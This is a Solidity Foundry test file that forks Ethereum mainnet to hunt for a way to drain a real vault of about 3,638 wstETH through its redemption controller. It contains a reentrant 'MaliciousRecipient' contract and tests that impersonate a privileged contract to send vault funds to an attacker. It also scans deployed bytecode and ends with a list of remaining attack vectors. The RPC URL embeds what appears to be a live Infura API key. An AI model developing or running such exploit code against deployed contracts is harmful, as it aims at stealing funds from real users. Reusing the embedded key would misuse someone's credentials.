// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Malicious recipient that reenters
contract MaliciousRecipient {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    address public owner;
    bool public reentered;

    constructor() {
        owner = msg.sender;
    }

    // This gets called when we receive wstETH
    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Try to reenter or exploit
        }
    }

    // Transfer wstETH to owner
    function withdraw() external {
        IERC20(wstETH).transfer(owner, IERC20(wstETH).balanceOf(address(this)));
    }
}

contract RecipientManipulation is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    MaliciousRecipient malicious;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        vm.prank(attacker);
        malicious = new MaliciousRecipient();
    }

    function test_TraceRedemptionFlow() public {
        console.log("=== TRACING REDEMPTION FLOW ===\n");

        // The flow should be:
        // 1. redeem(uint96) - creates request, burns IAU
        // 2. (wait 7 days)
        // 3. finalizeRedeem(uint256) - calls RC.redeem(amount, recipient)

        // Key question: how is 'recipient' determined?
        // - Is it msg.sender of finalizeRedeem?
        // - Is it stored in the request struct?
        // - Is it derived from something else?

        // Let's check by pranking as REDEMPTION_0 and calling RC directly
        // with different parameters

        console.log("Testing RC.redeem parameter handling:");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Call 1: redeem to attacker
        vm.prank(REDEMPTION_0);
        (bool s1,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(100, attacker):", s1);
        console.log("  Attacker received:", IERC20(wstETH).balanceOf(attacker) / 1e18);

        // Call 2: redeem to malicious contract
        vm.prank(REDEMPTION_0);
        (bool s2,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, address(malicious))
        );
        console.log("redeem(100, malicious):", s2);
        console.log("  Malicious received:", IERC20(wstETH).balanceOf(address(malicious)) / 1e18);

        // Call 3: redeem to VAULT (self-referential)
        vm.prank(REDEMPTION_0);
        (bool s3,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, VAULT)
        );
        console.log("redeem(100, VAULT):", s3);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_CheckFinalizeRedeemRecipient() public view {
        console.log("=== CHECKING FINALIZEREDEEM RECIPIENT ===\n");

        // When finalizeRedeem is called, how does it determine the recipient?
        // Let's look at the bytecode pattern

        bytes memory code = REDEMPTION_0.code;

        // finalizeRedeem = 0xaff6cbf1
        // It should:
        // 1. Load request from storage
        // 2. Call RC.redeem(amount, recipient)

        // Look for where RC.redeem selector (0x7bde82f2) appears
        bytes4 rcRedeem = bytes4(0x7bde82f2);

        console.log("Searching for RC.redeem selector in REDEMPTION_0:");
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == rcRedeem) {
                    console.log("Found at offset:", i);

                    // Look for CALLER (msg.sender) nearby
                    for (uint j = i > 50 ? i - 50 : 0; j < i; j++) {
                        if (uint8(code[j]) == 0x33) {
                            console.log("  CALLER at:", j);
                        }
                        if (uint8(code[j]) == 0x54) {
                            console.log("  SLOAD at:", j);
                        }
                    }
                }
            }
        }
    }

    function test_SimulateViaContractCall() public {
        console.log("=== SIMULATING VIA CONTRACT CALL ===\n");

        // What if we call REDEMPTION_0 from a contract?
        // Does msg.sender change?

        deal(IAU, address(malicious), 10000e18);

        // Approve from malicious contract
        vm.prank(address(malicious));
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try to create redemption from malicious contract
        vm.prank(address(malicious));
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem from contract:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // If success, try to finalize
        if (s1) {
            vm.warp(block.timestamp + 8 days);

            vm.prank(address(malicious));
            (bool s2,) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );
            console.log("finalizeRedeem:", s2);

            console.log("Malicious wstETH:", IERC20(wstETH).balanceOf(address(malicious)) / 1e18);
        }
    }

    function test_CheckDelegatecallContext() public view {
        console.log("=== CHECKING DELEGATECALL CONTEXT ===\n");

        // The "action chaining" hint might mean:
        // 1. Call A that sets up delegatecall context
        // 2. In that context, call B that triggers the exploit

        // When REDEMPTION_0 does delegatecall to implementation:
        // - msg.sender is preserved
        // - address(this) is REDEMPTION_0
        // - storage is REDEMPTION_0's

        // So even if implementation has exploit code, we can't inject our address

        console.log("Delegatecall context analysis:");
        console.log("- msg.sender: preserved from original caller");
        console.log("- address(this): REDEMPTION_0 or REDEMPTION_1");
        console.log("- storage: REDEMPTION_0/1's storage");
        console.log("");
        console.log("To exploit, need to either:");
        console.log("1. Modify storage slot containing delegatecall target");
        console.log("2. Find function that uses calldata for delegatecall target");
        console.log("3. Find callback that executes in Redemption context");
    }

    function test_CheckForMsgSenderUsage() public view {
        console.log("=== CHECKING MSG.SENDER USAGE IN REDEMPTION_0 ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Count CALLER (msg.sender) usage
        uint callerCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x33) {
                callerCount++;
            }
        }
        console.log("CALLER (msg.sender) count:", callerCount);

        // Find CALLER near CALL opcodes
        console.log("\nCALLER near CALL patterns:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x33) { // CALLER
                // Check if there's a CALL within 100 bytes
                for (uint j = i; j < i + 100 && j < code.length; j++) {
                    if (uint8(code[j]) == 0xf1) { // CALL
                        console.log("CALLER at", i, "-> CALL at", j);
                        break;
                    }
                }
            }
        }
    }

    function test_FinalSummary() public view {
        console.log("=== FINAL VULNERABILITY SUMMARY ===\n");

        console.log("PROVEN:");
        console.log("- RC.redeem(amount, to) drains Vault to 'to' address");
        console.log("- Only REDEMPTION_0 and REDEMPTION_1 can call RC.redeem");
        console.log("- Vault balance: ~3,638 wstETH (~$8.37M USD)");
        console.log("");
        console.log("UNPROVEN:");
        console.log("- How an unprivileged attacker triggers the call");
        console.log("- The 'action chaining' entry point");
        console.log("");
        console.log("INVESTIGATED:");
        console.log("- DELEGATECALLs: All use hardcoded or storage addresses");
        console.log("- Storage: Not writable by public functions");
        console.log("- Upgrade: No upgrade functions available");
        console.log("- Initialize: Contracts not reinitializable");
        console.log("- Callbacks: No obvious callback exploitation");
        console.log("- Token hooks: No exploitable hooks found");
        console.log("");
        console.log("REMAINING VECTORS:");
        console.log("- Flash loan + complex state manipulation");
        console.log("- Cross-protocol interaction (Aave, etc.)");
        console.log("- Time-based conditions not yet met");
        console.log("- Hidden function selector not yet discovered");
    }
}
